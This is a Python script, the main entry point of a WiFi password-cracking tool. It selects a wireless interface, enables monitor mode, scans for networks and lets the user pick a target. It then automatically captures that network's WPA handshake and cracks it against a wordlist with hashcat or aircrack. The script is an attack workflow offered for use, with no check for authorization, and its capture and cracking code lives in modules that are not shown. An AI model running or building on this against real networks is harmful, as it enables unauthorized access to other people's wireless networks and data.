#!/usr/bin/env python3
"""
WiFi BruteForce Tool - Main Entry Point
Professional refactored version with modular architecture
"""

import sys
import time
import re
from pathlib import Path

# Add src directory to Python path for imports
sys.path.insert(0, 'src')

# Import modules from new structure
from src.ui.display import (
    print_banner, print_step, print_info, print_error, print_success,
    print_warning, display_networks, display_completion, enable_ansi_windows
)
from src.utils.system import check_root, check_dependencies
from src.wifi.operations import get_wireless_interface, enable_monitor_mode, disable_monitor_mode
from src.wifi.scanner import scan_networks, select_network
from src.wifi.capture import capture_handshake_automatic
from src.cracking.cracker import check_gpu_available, crack_with_hashcat, crack_with_aircrack
from src.utils.wordlist import get_wordlist_path
from src.config.constants import WORDLIST_DOWNLOAD_URL, CAPTURE_DIR


def main():
    """Main application workflow"""
    print_banner()
    enable_ansi_windows()

    # Check system requirements
    check_root()
    HAS_HASHCAT, HAS_HCXTOOLS = check_dependencies()

    # Step 1 – Interface
    print_step(1, 5, "Select Wireless Interface")
    interface = get_wireless_interface()

    # Step 2 – Scan & select network
    print_step(2, 5, "Scan and Select WiFi Network")
    monitor_interface = enable_monitor_mode(interface)

    selected_network = None
    while not selected_network:
        networks = scan_networks(monitor_interface)
        networks = display_networks(networks)

        if networks:
            selected_network = select_network(networks)
            if not selected_network:
                print_info("Rescanning...")
        else:
            print_error("No networks found!")
            from src.ui.display import Colors
            retry = input(f"{Colors.WARNING}Try scanning again? (y/n): {Colors.ENDC}").strip().lower()
            if retry != 'y':
                disable_monitor_mode(monitor_interface)
                sys.exit(1)

    # Step 3 – Wordlist
    print_step(3, 5, "Select Wordlist")
    wordlist = get_wordlist_path(WORDLIST_DOWNLOAD_URL)

    # Step 4 – Capture handshake
    print_step(4, 5, "Capture Handshake (Automatic)")

    output_dir = Path(CAPTURE_DIR)
    output_dir.mkdir(exist_ok=True)
    safe_essid = re.sub(r'[^\w\-]', '_', selected_network['essid'])
    output_file = str(output_dir / f"capture_{safe_essid}_{int(time.time())}")

    try:
        cap_file = capture_handshake_automatic(
            monitor_interface,
            selected_network['bssid'],
            selected_network['channel'],
            output_file,
            selected_network['essid']
        )

        if cap_file and wordlist:
            # Step 5 – Crack
            print_step(5, 5, "Crack Password")
            if check_gpu_available() and HAS_HCXTOOLS:
                crack_with_hashcat(cap_file, wordlist)
            else:
                crack_with_aircrack(cap_file, wordlist)
        elif cap_file and not wordlist:
            print_info("Skipping password cracking (no wordlist)")
            print_success(f"Handshake saved to: {cap_file}")
        elif not cap_file:
            print_error("Failed to capture handshake")

    finally:
        display_completion()
        disable_monitor_mode(monitor_interface)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        from src.ui.display import Colors
        print(f"\n\n{Colors.WARNING}Operation cancelled by user{Colors.ENDC}")
        print_info("Cleaning up...")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)